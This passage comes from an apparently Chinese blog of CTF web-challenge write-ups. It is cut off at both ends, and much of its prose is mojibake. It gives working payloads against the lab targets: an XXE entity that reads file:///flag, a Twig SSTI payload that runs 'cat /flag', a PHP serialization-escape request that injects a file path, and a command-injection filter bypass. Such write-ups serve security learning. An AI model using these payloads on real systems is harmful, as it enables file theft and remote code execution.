</span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">]&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>ä¸€çœ¼sstiï¼Œä½†æ˜¯æˆ‘è‡ªå·±æ²¡æ•´å‡ºæ¥</p><p>å…ˆä»¥adminç™»å½•ç…ç… è¿”å› Hello adminï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131852252.png" alt="image-20220113185236167"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131853886.png" alt="image-20220113185308811"></p><p>æ ¹æ®SSTiå†³ç­–å›¾ï¼Œè¿™é¢˜æ˜¯Twig</p><p>æœ‰payload <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131855366.png" alt="image-20220113185531225"></p><div class="code-wrapper"><pre><code class="hljs">ä¸€ä¸ªå•†åº—é¡µé¢ï¼Œåº”è¯¥æ˜¯ä¹°ç¬¬å››ä¸ªå•†å“ï¼Œè¿™ç§é¢˜ç›®ä¸€èˆ¬æ˜¯æ”¹HTTPæ•°æ®åŒ…ï¼Œä½†æ˜¯è¿™é¢˜æ˜¾ç„¶ä¸æ˜¯ã€‚åˆ«çš„æƒ³æ³•æ²¡å•¥èƒ½å®ç°çš„ï¼Œè€ƒè™‘åˆ°é¢˜ç›®åç§°Uni</code></pre></div><p>å¯èƒ½è€ƒå¯Ÿçš„Unicodeç¼–ç é—®é¢˜ã€‚</p><p>åœ¨è¿™ä¸ªç½‘ç«™ä¸Šæœç´¢å­—ç¬¦ä¸²å°±è¡Œ     <a href="https://www.compart.com/en/unicode/U+2188">https://www.compart.com/en/unicode/U+2188</a> è¿™é‡Œç»™çš„æˆ‘çš„ç»“æœ</p><p>åªè¦è®©ä»–çš„value &gt;1337 å³å¯ </p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>è®¿é—®å¾—æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>æç¤ºphpinfoæœ‰è´§ éƒ¨åˆ†ä¿¡æ¯ $php_version=7.0.33 ,auto_append_file=d0g3_f1ag.php </p><p>å¯ä»¥çœ‹åˆ°filterå¯¹åºåˆ—åŒ–åçš„ä¿¡æ¯è¿›è¡Œå¤„ç†,å±äºååºåˆ—åŒ–å­—ç¬¦ä¸²æ•°å˜å°‘çš„æƒ…å†µ</p><p>æ„å»ºæµ‹è¯•æ ·ä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>    <span class="hljs-variable">$o</span>=serialize(<span class="hljs-variable">$_SESSION</span>);<br>    var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¸Œæœ›imgå‚æ•°å¯æ§ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦è®©ä»–é€ƒé€¸å‡ºå»</p><p>éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²ä¸º <code>;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; </code>  é•¿åº¦40 è¿™é‡ŒZDBnM19mMWFnLnBocA==æ˜¯d0g3_f1ag.phpå–Base64çš„ç»“æœã€‚</p><p>é‡æ–°æ„å»º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>  <span class="hljs-comment">//  $_SESSION[&#x27;img&#x27;] =&#x27;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;</span><br><br>    <span class="hljs-variable">$o</span>=serialize(<span class="hljs-variable">$_SESSION</span>);<br>    var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¸Œæœ›æ˜¯functionè¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥æŠŠåé¢çš„ä¸œè¥¿æŒ¤å‡ºå»</p><p>ç„¶åçœ‹ guest ä¹‹å å’Œå¸Œæœ›é€ƒé€¸å­—ç¬¦ä¸²ä¹‹å‰çš„å­—ç¬¦ä¸²å†…å®¹ <code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> å› ä¸ºä»–çš„filterå‡½æ•° æŠŠ å­—é•¿4 å˜æˆ å­—é•¿0æ‰€ä»¥è¿™é‡Œæ˜¾ç„¶è¦è®©</p><p> <code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> æ˜¯4çš„å€æ•° å³24</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br><span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br><span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>;  <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;&#x27;</span>;   <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><span class="hljs-variable">$o</span>=filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br>var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//&quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:40:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span><br>var_dump(unserialize(<span class="hljs-variable">$o</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™æ²¡æœ‰ååºåˆ—åŒ–æˆåŠŸ</p><p>äºæ˜¯åŠ ä¸Š å› ä¸ºimgè¢«æŒ¤å‡ºå»äº†ï¼Œè¿™ä¸ªæ—¶å€™éšä¾¿å¼•å…¥ä¸€ä¸ªå°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br><span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br><span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>;  <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;   <span class="hljs-comment">//24</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br><span class="hljs-variable">$o</span>=filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br>var_dump(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment">//a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br>var_dump(unserialize(<span class="hljs-variable">$o</span>));<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//ååºåˆ—åŒ–ç»“æœ</span><br><span class="hljs-comment">/*array(3) &#123;</span><br><span class="hljs-comment">  &#x27;user&#x27; =&gt;</span><br><span class="hljs-comment">  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:58:&quot;1&quot;</span><br><span class="hljs-comment">  &#x27;img&#x27; =&gt;</span><br><span class="hljs-comment">  string(20) &quot;ZDBnM19mMWFnLnBocA==&quot;</span><br><span class="hljs-comment">  &#x27;a&#x27; =&gt;</span><br><span class="hljs-comment">  string(1) &quot;b&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span>: /<span class="hljs-keyword">index</span>.php?f=show_image<br><br>POST:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=<span class="hljs-number">1</span>&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°çœŸflagæ–‡ä»¶å</p><p>æœ€åbase64ç¼–ç çœŸflag/d0g3_fllllllag</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span>:/<span class="hljs-keyword">index</span>.php?f=show_image<br>POST:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=<span class="hljs-number">1</span>&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;<br></code></pre></td></tr></table></figure><p>getFlag</p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>è®¿é—® robots.txt</p><p>å‘ç° fAke_f1agggg.php ï¼Œå‡flag ç„¶ååœ¨æ•°æ®åŒ…é‡Œå‘ç° Look_at_me:/fl4g.php</p><p>è®¿é—®å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img src=<span class="hljs-string">&quot;/img.jpg&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é´æˆœç¬‰ç¼å¿”å‰°é—‚å¯¸æ¹…æµœå—™æ¹…é´æˆ æ®‘é”å†²å§æ¾¹ï¿½, æ¶“å¶†æ§¸é¯å´‡æ¹…éƒå •æ£¿, é™î…æ§¸é¯å……ç¬‰ç¼å¿”å‰°é—‚ï¿½, ç’â•€ç¶˜é­ãƒ©äº¾é´æˆ£ç¹ƒå¯°æ¥ç˜®æµ£çŠ²ã‚½.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é–²æˆ¦æŒ¶ç‘™ï½…å–…æ¶“å¶„ç°¡ç»Œèœ‚æ±‰é¨å‹¬æ¹°ç’ã„©æ£¶æ£°ï¿½&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==md5(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é¯å†²åŸŒæ©æ¬é‡œCTFeré·å®åŸŒflagéšï¿½, é°ç†¸ç¸ºå¨‘æ›¢æµ‚, ç’ºæˆå¹“æ¶“æ»„ç·¶å®€ï¿½, éµå¥ç«´ç€¹å •î˜µé˜ï¿½, é¶å©‚å¸¹ç”¯å £æ¡¨é‘å“„å¹“, é‘·î„ç¹éæè¢±æ¶“î…å¬éµå¬ªçš¬é‘¿ï¿½, éŠæç«´é‰îˆ›æšç‘å‘¯æ«§é–°ï¿½, é‘·æ‘ç˜œéˆå¤äº¾, é’î‚¢î„Ÿçå¿”æ¯š.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é´æˆ£åˆ€ç»±Ñƒæˆé‰ãƒ¦åœé¨å‹¯å­é‘²å¤‹æ¹…é™ï¿½, æµ æ ¨å¢¦æµœå—•é‡œé¢ä½ƒç˜½, é¶å©ç²¬æ¶“â‚¬ç€¹è·ºç•¨éºæ‘åŸŒæµœå—›æ½ªå¨²ï¿½&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!strstr(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = str_ireplace(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;é¯å†²åŸŒæ©æ¬“å™·, é´æˆå–ç€¹ç‚¶â‚¬å±¾î‚¾é±ï¿½, éˆå¤æŒ¶æµœè™¹æ®‘è¹‡î‚¡ç®°å¯°â‚¬å¯°â‚¬çè¾¨æ§¸æ©æ¬ç®é¨å‹¬æ¹¸ç€¹ç‚´æ£¤é—ï¿½, æ¶“æ—€çŸé•ï¿½.&lt;/br&gt;&quot;</span>;<br>        system(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¹‡î‚¢åŸŒé—ˆç‚´åºŠæµœï¿½&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶ä¹±ç æ‰“æ­»ä½ hiä¸å½±å“åšé¢˜ï¼Œå¾ˆæ˜æ˜¾è¦è¿è¡Œåˆ°36è¡Œ</p><p>less-1 :     fl4g.php?num=2e10  è¿™æ ·ä¿å­˜ç»“æœæ˜¯2 è¿è¡Œç»“æœæ˜¯2e10</p><p>less-2:     ctfshowä»¥å‰é‡åˆ°è¿‡  /fl4g.php?num=2e10&amp;md5=0e215962017</p><p>ä¸æ˜¯ä¸‹ä¸€ä¸ªæˆ‘å°±ä¸ç†è§£äº†ï¼Œä¹Ÿä¸æ˜¯åªæœ‰catå¯ä»¥æŸ¥æ¡ˆçœ‹æ–‡æœ¬ä½†æ˜¯ä»–ä¹Ÿæ²¡è¿‡æ»¤åˆ«çš„å‘½ä»¤ä¸çŸ¥é“ä¸ºå•¥åªèƒ½cat</p><p>æœ€ç»ˆ</p><p><code>fl4g.php?num=2e10&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 